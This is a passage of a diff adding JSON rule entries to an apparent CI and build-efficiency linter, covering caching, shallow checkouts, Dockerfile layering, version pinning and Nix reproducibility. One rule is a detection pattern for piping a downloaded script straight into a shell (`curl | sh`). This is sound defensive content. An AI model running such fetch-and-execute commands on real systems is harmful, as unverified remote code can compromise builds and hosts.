+        "claim": "A workflow that only runs on `pull_request` saves caches no other pull request or branch can restore."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "A cache saved by a pull_request run is scoped to its merge ref and can be useful on subsequent commits or reruns of that pull request, but cannot seed other pull requests or the base branch. PR runs can also restore accessible base/default-branch caches with compatible keys and versions. No recognized non-PR writer in the inspected repository does not prove no cache exists: history, external workflows and other cache actions may supply one. Compare hit rates, transfer cost and storage policy before adding trusted-branch warming; do not remove useful PR writes automatically."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "caching/setup-cache",
+      "metadataSha256": "eae82b9409bb1a8744fe8989a0ab37b20936103e4fbdd52038b0bf718c7b8ddd",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Language setup actions should cache downloaded dependencies."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "Dependency downloads can be a large repeated cost on fresh runners. An effective cache may reduce that cost, but prewarmed runners, external caches and restore/upload overhead can change the benefit; measure the affected job. setup-node, setup-python, setup-java and setup-dotnet support explicit `cache` settings (setup-node v6+ also auto-caches npm when package metadata selects npm); setup-go caches by default."
+      },
+      "autofix": "not-formally-proved",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "caching/uncompressed-artifact-upload",
+      "metadataSha256": "d24912eb0fdc804ed17255ecdab089cc8786b20dd636c19fc3708d0364c8fdca",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Artifacts that only contain already-compressed files should be uploaded with `compression-level: 0`."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "Recognized actions/upload-artifact versions default to compression-level 6. Extensions such as .gz and .zip commonly identify compressed content, but archives may contain uncompressed entries and extension alone is not evidence of actual bytes or upload-time savings. Level 0 preserves extracted file contents but changes archive bytes, size and digest. Compare representative transfer/storage cost and consumer expectations before manually changing compression policy."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "checkout/affected-base-ref",
+      "metadataSha256": "be35d05e489005939ae7d98651fabb69b805a591b9672382d4a556fc96034b59",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Affected/changed-only commands need the base commit, which a default shallow checkout does not fetch."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "`actions/checkout` fetches a single commit by default. Affected-only tooling (nx affected, turbo --affected, pnpm/turbo `[ref]` filters, jest --changedSince, git diff against the base) then either fails with an unknown revision or silently falls back to running everything, which defeats the selection that makes agent-scale CI affordable."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "checkout/partial-clone",
+      "metadataSha256": "fa2e53db222b503e755ac42b5458445e4e6656236eab845b22d9f9e31dec8df3",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Full-history checkouts (`fetch-depth: 0`) should use a blobless partial clone (`filter: blob:none`)."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "`fetch-depth: 0` downloads every version of every file ever committed, which dominates checkout time in large or long-lived repositories. A blobless partial clone keeps the full commit graph that history-aware tools (affected detection, changelogs, versioning) need, and fetches file contents lazily only when a command reads them. Agent-driven repositories run many more jobs, so the saving compounds."
+      },
+      "autofix": "not-formally-proved",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "checkout/sparse-checkout",
+      "metadataSha256": "50471dd5a25efc228a4bc2dbbea70abb16390ee6d19daa5767da9ccd2422e899",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Jobs that only work inside one workspace package of a large monorepo can use a sparse checkout."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "In large monorepos most of the checkout is files a package-scoped job never reads. A cone-mode sparse checkout of the package, its workspace dependencies, and shared config keeps checkout and disk usage proportional to the job, which adds up when agents trigger many small package-level runs."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "containers/apt-hygiene",
+      "metadataSha256": "426a78815455c501e7f4957429951f57b27ff6bdbbdfc61f8d203ba6a6d27e1f",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "apt and apk installs in Dockerfiles should skip recommended packages, update and install in one layer, and not leave package caches in the image."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "Recommended packages and leftover package indexes add tens of megabytes to every layer that is pushed, pulled, and cached. `apt-get update` in its own RUN creates a layer that BuildKit keeps reusing, so later installs run against a stale index (or fail). Smaller layers mean faster pulls on every ephemeral CI runner and agent sandbox."
+      },
+      "autofix": "not-formally-proved",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "containers/buildx-load-multiplatform",
+      "metadataSha256": "51af50a69b35eb0e172fa200f44391a9cf95cb13f721b5e6be255216840bf97f",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Multi-platform image builds must not be loaded into the classic Docker image store of a GitHub-hosted runner."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "The classic Docker image store cannot hold multi-platform images. Loading a multi-platform build therefore requires a compatible exporter and containerd image store, or a separate single-platform test build. Runner labels alone do not prove which store is enabled: hosted images change and workflows can address custom daemons. This is a compatibility check to verify, not a prediction that every such job fails."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "containers/cache-mount",
+      "metadataSha256": "72d8237288915f71631ab2471eec240453b05ff80fe483f85c059805d39bac59",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Dependency installs and compiles in Dockerfiles should use BuildKit cache mounts for package-manager and compiler caches."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "When a dependency layer is invalidated, a cache mount (`RUN --mount=type=cache`) lets the package manager reuse previously downloaded packages and compiler output instead of fetching everything again, and keeps those caches out of the image. Cache mounts live in the builder, so on ephemeral hosted runners pair them with a persistent builder or export them (for example with buildkit-cache-dance) to benefit across CI runs."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "containers/curl-pipe-shell",
+      "metadataSha256": "76fe440c3ff91556ec99392fb6dd5cbfad0232ced8bb7772e56be34f6decf803",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "A script is downloaded and executed in one go (`curl | sh`, `bash <(curl ...)`) without checksum or signature verification."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "A direct download-to-interpreter stream executes bytes before the complete payload can be checked locally. A checksum command elsewhere in the step, or a check after execution, does not verify that stream. Download to a file and require successful verification of that exact file before execution. Use an independently trusted expected digest or signing key. Verification authenticates payload bytes; it does not make the script, its network dependencies or the overall build hermetic."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "containers/dependency-layer",
+      "metadataSha256": "1093f72ba0516750bdb5c0b4078e49561f0c5c93b1b647ba2e749e3b9e50c7da",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Dockerfiles should install dependencies from manifests and lockfiles before copying the rest of the source tree."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "BuildKit reuses a layer only while every input above it is unchanged. Copying the whole context before the install means each source edit (every agent iteration) re-downloads and re-installs all dependencies; copying only manifests and lockfiles first keeps the dependency layer cached until dependencies actually change."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "containers/docker-no-cache-build",
+      "metadataSha256": "650b13c60d39ebd3515d06eed7ff2ce9da6abd284bd09e77118d045a24126dd3",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Push and pull-request image builds should not pass --no-cache when they import a cache (cache-from) or run on a persistent self-hosted builder."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "`--no-cache` bypasses reusable instruction results for the stages built; unused stages need not run, and cache mounts or external dependency caches can still help. A declared cache import or self-hosted builder does not prove a usable hit. `--pull` refreshes base-image resolution but does not refresh an otherwise cached RUN apt-get install or other mutable download. Preserve the project's freshness policy; measure cache hits and use intentional full or selected-stage rebuilds when required."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "containers/dockerignore",
+      "metadataSha256": "d545f039c138655dd826277142496a031c75fd89e590cf6810e8ff64ee36f9db",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Docker build contexts that are copied into images should have a .dockerignore excluding .git and node_modules."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "Without a .dockerignore, `COPY . .` sends and hashes the whole context, including `.git`, `node_modules`, and local build output. Every commit, install, or agent scratch file then changes the COPY checksum and invalidates that layer and everything after it, and large contexts slow down every build."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "containers/gha-cache-missing-scope",
+      "metadataSha256": "75ccae27a10242c0a780777aa76af923956fcefe773cc1fed403d73214909556",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Consider distinct gha cache scopes for modeled build variants that can replace each other's cache index."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "The gha backend's scope defaults to buildkit. Multiple exports sharing that scope can replace its index within the same repository/branch cache namespace. Some layers, local builder caches or other imports can still be reused; replacement is not proof of rebuilding from scratch. Scope expressions should distinguish relevant image/platform variants and agree across every importer/exporter. That cross-file contract is not established by this detector, so changes require review rather than automatic edits."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "containers/gha-cache-mode-min",
+      "metadataSha256": "6aaef1882a9b789d208a76f250756a3162e94d2431ff77acc7ec1f620bc5f57a",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "A multi-stage build exports a minimal cache that omits intermediate-stage layers."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "BuildKit's mode=min export includes layers in the resulting image, not all intermediate-stage layers. A fresh builder relying only on that export may repeat intermediate work; local caches and other exporters can still avoid it. mode=max exports intermediate layers too, which can increase transfer/storage and disclose source or sensitive files intentionally omitted from the final image. Review cache access, secret handling and measured benefit before opting in; this is not a safe automatic edit."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "containers/multi-stage",
+      "metadataSha256": "e65ae2cf0a5faf9c4f88b57be1a7f8cd96c4f9726bb592a28e37699450264ffc",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Single-stage Dockerfiles that install build toolchains or dev dependencies should use a builder stage and a minimal runtime stage."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "Compilers, git, and devDependencies are only needed to build. Shipping them makes every pull, push, and layer upload larger and slower (and widens the attack surface). A multi-stage build compiles in a builder stage and copies only artifacts into a slim or distroless runtime stage; BuildKit also builds independent stages in parallel."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "containers/pnpm-fetch-docker-layer",
+      "metadataSha256": "3cecc210c659e852dcb33dc8b696ec9408aed2bd7057dcbe7d4b61ec58ce9fc5",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "A pnpm-workspace Dockerfile copies every workspace package.json before `pnpm install` instead of warming the store with `pnpm fetch`."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "Copying workspace manifests before installation can invalidate the install layer on non-dependency edits. A warm pnpm store or cache mount may already avoid downloads. pnpm fetch can separate dependency fetching from manifest changes, but also depends on pnpm version, workspace configuration, patches, authentication and relevant build inputs. An offline install still performs linking and may run lifecycle scripts. Preserve frozen-lock policy and all required inputs, then benchmark."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "containers/qemu-emulated-multiarch",
+      "metadataSha256": "fd58f38070f08d531f11e424dc00c9564404351d83997571e89920fe25ddc477",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Potentially emulated multi-platform builds are candidates for measured native-runner or cross-compilation alternatives."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "Registering QEMU and requesting a foreign platform does not establish that build steps execute under emulation: native remote nodes, fixed-platform stages, cross-compilation, pruning and cache hits may avoid it. Where measurements show emulated compilation/compression, native nodes or cross-compilation can help. Compare full build and publication costs, verify hosted-runner availability, and preserve every platform, tag, artifact and test requirement."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "containers/runtime-tool-install-vs-container",
+      "metadataSha256": "50950938f32dc918249102302bde5f5d2b08446988609699fb518a7dc289ae8d",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "The same tools are installed at runtime in several jobs instead of being baked into a job container image."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "Repeated tool installation specifications may be worth consolidating, but downloads can already be cached and versions may already be pinned. A job container replaces installation work with image build/pull/maintenance costs and changes OS, user, shell, networking and action compatibility. Tags are mutable: a reviewed image digest identifies the intended image. Benchmark and validate the migration; repeated command text is not proof of repeated network work or equivalent artifacts."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "containers/shared-base",
+      "metadataSha256": "eea63cfbc9a4c8151cea98eccb39877786d3bb344a70e2ce0fde6c5575ba7cbf",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Review repeated base-image and toolchain preambles for possible shared-base reuse."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "A published shared base can move repeated toolchain installation into a separate build, but existing layer caches may already reuse that work. Compare build savings with publication and image-pull costs, preserve platform and per-service requirements, and maintain reviewed digest updates. Matching preamble text alone does not prove equivalent execution or a speedup."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "containers/sleep-polling-health-check",
+      "metadataSha256": "7974e1f7309b82f0d1485341c5dac32922e5fa78d41cb1e1c6e4a5474d4215c4",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "A job with service containers waits for them with a fixed `sleep` instead of a `--health-cmd` health check."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "A fixed sleep may wait longer than a useful readiness probe or fail on a slow start. However, the image may already define HEALTHCHECK and the sleep may await unrelated work. An explicit probe helps only if it tests the same readiness condition; polling intervals, retries and credentials affect correctness and latency. This rule observes a sleep and absent workflow-level health command, not the image's configuration or the sleep's purpose."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "hermeticity/docker-base-digest",
+      "metadataSha256": "0315481c809df21356dd5fd7985c1b56c16e05d813979912cab7ed7247adf3a7",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Dockerfile base images should use pinned versions (and digests when required)."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "Untagged and latest-tag base images can change when their registry tags move, affecting build inputs and layer reuse. Version tags communicate upgrade intent but can also move. A digest pins the referenced image content; it does not make the entire build reproducible, because downloads, toolchains and other inputs may still vary."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "hermeticity/frozen-lockfile",
+      "metadataSha256": "451f2dfa7fbbd12e9f2890b0f1c1550ada0ab78939587f1f80ea2a4dc95091a4",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "CI installs must be locked to the committed lockfile."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "`npm install` and unfrozen yarn/bun installs can rewrite the lockfile and resolve different versions per run, which breaks reproducibility and cache keys. Frozen installs are also faster."
+      },
+      "autofix": "not-formally-proved",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "hermeticity/pin-actions",
+      "metadataSha256": "428a509988c70abef3b8ea941952d3929df6d906cae55412ee2e4a8a0a1c22ac",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Third-party actions and reusable workflows should be pinned to a full commit SHA."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "Tags and branches can be moved, so `@v4` may run different code tomorrow than today, which breaks reproducibility and is a supply-chain risk. A full-length commit SHA is immutable. (OpenSSF Scorecard also treats a tag backed by an immutable release as pinned, but most action tags are not immutable releases and this cannot be verified offline.)"
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "hermeticity/pin-container-images",
+      "metadataSha256": "7bdfd2926d9ba7576d59dfcabc48635266a4abe0469488939706dce8397b5c18",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Job containers and service containers should use pinned image versions."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "Untagged and latest-tag images can change between runs when registry tags move. Version tags communicate upgrade intent but can also move. A digest pins the referenced image content; it does not establish reproducibility of the full job or of mutable external dependencies."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "hermeticity/pin-runner",
+      "metadataSha256": "301a5280a0bc9f51e80b04e455097e8f828c3f83618c486e47f42c62f1e2f013",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Jobs should run on a pinned runner image label instead of `*-latest`."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "`ubuntu-latest`, `windows-latest` and `macos-latest` move to a new OS image during a gradual multi-week rollout, so identical commits can pass on one run and fail on the next with different toolchains and preinstalled software. `ubuntu-latest` is migrating from Ubuntu 24.04 to 26.04 between Oct 19 and Nov 19, 2026. Pinning makes the upgrade a deliberate, reviewable change."
+      },
+      "autofix": "not-formally-proved",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "nix/accept-flake-config-untrusted",
+      "metadataSha256": "c6610d8a0d9ec908e693209f9d7bc8859f744f0fd28b2f2205f789a68d4935f3",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Nix accepts `nixConfig` from flakes that a pull request can modify."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "accept-flake-config allows eligible nixConfig settings from an evaluated flake without the usual confirmation. If a pull request controls that flake, it can influence settings such as substituters and trusted keys. Which settings take effect, and with what privilege, depends on Nix version, single-user versus daemon installation, trusted-user policy and CLI overrides; this detector does not establish root execution or cache compromise. Keep configuration policy outside untrusted flake content, especially when pull_request_target checks out the head or a persistent runner/cache is exposed. Disabling this setting alone does not make executing untrusted workflow code safe."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "nix/builtins-fetchurl-unverified",
+      "metadataSha256": "adf1fc97414e9fcdfe7c740dad8cb4e2858df61aac68090f885cb8120141b6b5",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "`builtins.fetchurl` downloads at evaluation time without an integrity check; pin it with `sha256` or use the `pkgs.fetchurl` fixed-output fetcher."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "When demanded, an unpinned builtins.fetchurl call lacks a declared expected content digest. Download/cache behavior depends on Nix settings and availability, and pure evaluation rejects an unpinned demanded fetch. Importing the result may evaluate remote Nix code. A reviewed digest constrains bytes, not source trust or whole-build reproducibility. pkgs.fetchurl is a build-time fixed-output fetcher; substituting it into evaluation-time code can introduce IFD, so it is not a universally equivalent replacement."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "nix/channel-in-ci",
+      "metadataSha256": "e112f5fde4b3003bdaa156af95ff090d822cacb822cca637da7380fc803d6692",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "`nix-channel --add/--update` in CI makes evaluation depend on a channel that moves."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "Channel subscriptions live outside the Nix expressions consuming them. A mutable channel URL can resolve differently after an update, while immutable snapshots, explicit search paths and recorded revisions can constrain or document the selection. Adding a channel alone does not establish that a build uses it. Prefer an explicit, reviewed dependency policy where frozen inputs are required; this detector does not establish reproducibility or the presence/absence of runtime provenance."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "nix/current-system-builtin",
+      "metadataSha256": "bb7e3b65b36a52168af9a44f75b3ce3a0fa6cb8dd5dcb41c5f6faf4c89cdc98c",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Nix expressions should not read `builtins.currentSystem`, the platform of the machine running the evaluation."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "builtins.currentSystem reads the evaluator's system/eval-system setting, not necessarily a remote builder's platform. If the value influences a derivation, different settings can select different outputs. Pure evaluation removes this constant, so a demanded reference fails; unused lazy expressions need not fail. Passing a system explicitly documents platform selection, but does not make different target platforms equivalent or prove reproducibility."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "nix/dev-shell-reinvoked-per-step",
+      "metadataSha256": "5c9dd2195f8e25fc07dd8f3458f7628f055075b914e9d5f13a23f5071cf4b488",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Several steps of one job each start the same `nix develop` / `nix-shell` environment."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "Every `nix develop --command` or `nix-shell --run` step starts Nix from scratch: it re-resolves the flake (or re-evaluates `shell.nix`, which has no evaluation cache and typically imports all of nixpkgs), realises the dev-shell environment, spawns a new bash that sources the stdenv setup, and re-runs the shell's `shellHook`, so hooks that install tools, create virtualenvs or print banners execute once per step. Loading the environment once with `nicknovitski/nix-develop` exports the shell's variables to `GITHUB_ENV` and its PATH entries to `GITHUB_PATH`, so later `run:` steps and third-party `uses:` actions see the toolchain without another Nix start. A job-level `defaults.run.shell: nix develop --command bash -e {0}` removes the repetition from the YAML but still starts `nix develop` in every step."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "nix/dockertools-single-layer-image",
+      "metadataSha256": "a5cb453f10d4be0c48af3a0c1af3770931b5207067ec530f0c881533ecaac5f9",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Container images built with `dockerTools.buildImage` put the whole closure in a single layer."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "buildImage adds a single layer above any reused base layers. A changed added layer can require transferring more data than a carefully layered image, unless the destination already has the blob. Layered builders separate selected store paths up to their layer limit and group the rest; resulting boundaries and reuse depend on the closure and settings. copyToRoot/contents and runAsRoot/fakeRootCommands are not equivalent APIs. Validate file layout, ownership, permissions and runtime behavior, then measure transfer sizes before migrating."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "nix/duplicate-nixpkgs-nodes",
+      "metadataSha256": "c90857d1143a434f42798f1fd1318909c9daf8f0e1056156a3c032da9010c653",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "A flake input brings its own nixpkgs revision instead of following the flake's `nixpkgs`, so flake.lock holds several nixpkgs copies."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "Distinct nixpkgs revisions can add source fetches, evaluation work and different derivations when those inputs are used. They do not imply that every package differs: unchanged derivations can still share store paths. A follows declaration changes the dependency revision and requires regenerating flake.lock; sharing a channel name does not establish compatibility. Review and test that change, including upstream binary-cache coverage, rather than applying it automatically."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "nix/fake-hash-committed",
+      "metadataSha256": "0b2253111d2b588e52d1449902e5e50b2b4fa9e1144c628696bc03549378a5cf",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": 'Placeholder hashes (`lib.fakeHash`, `""`, all-zero or `sha256-AAAA\u2026` values) must not be committed.'
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "The fake-hash workflow uses an empty or well-known placeholder digest to make a fixed-output build print its actual digest. Such values normally cause a mismatch if the corresponding derivation is built; static syntax alone cannot establish that an expression is evaluated or really feeds a fetcher. Templates can intentionally contain placeholders. Review the downloaded source independently before accepting a newly printed digest. vendorHash = null is not treated as a placeholder."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "nix/fetchgit-missing-rev",
+      "metadataSha256": "bfe8c22da1341ab85aa972d8e5301d0808f520382d25dc7886b881f632032c08",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "`builtins.fetchGit` of a remote repository should declare a revision or supported content-hash pin."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "fetchGit resolves a remote ref during evaluation. Without a revision or supported content-hash pin, a mutable branch or tag can select different source over time. Pure evaluation rejects unlocked inputs if evaluated. A full revision identifies a Git object, but does not guarantee local cache presence, remote availability, identical fetcher metadata across options or deterministic downstream builds."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "nix/fetchtarball-no-hash",
+      "metadataSha256": "50ad9c8e0ffe7b918297402b498aeef922a5fd1705b62b4d2781942275702f1c",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "`builtins.fetchTarball` should declare the expected unpacked-source `sha256`."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "fetchTarball downloads and unpacks during evaluation. Without an expected sha256, mutable URLs may yield different sources when cache entries expire; cache and offline settings affect revalidation. Pure evaluation rejects unpinned calls when evaluated. A declared digest checks unpacked source identity and permits reuse while the matching store object exists, but does not prevent garbage collection, guarantee availability or authenticate an unreviewed digest."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "nix/flake-check-missing-parallel-evaluator",
+      "metadataSha256": "8c05ff0b4fc52582018163c9fdef917d16e2428a68d94495961f9cd6f1b0d5c1",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "`nix flake check` runs on a flake with many outputs without a parallel evaluator or a per-output job matrix."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "Evaluation can be a bottleneck for flakes with many expensive outputs. This detector counts output-shaped source bindings, not evaluated outputs, elapsed time or CPU use; helper functions, lazy branches, systems and Nix versions can change the work. Parallel evaluators or job matrices may help but add overhead. Building checks with another tool does not replace flake-check validation of other output types: retain nix flake check --no-build with equivalent system/options coverage and test the combined behavior. Pin and review any additional tooling."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "nix/flake-lock-missing-input",
+      "metadataSha256": "4618d8cb0fd159582819fa8e6ccf66b62a0298d9881b9344e81431d6b9560279",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "flake.lock is out of date with flake.nix: an input has no lock entry, was changed without re-locking, or a node reference dangles."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
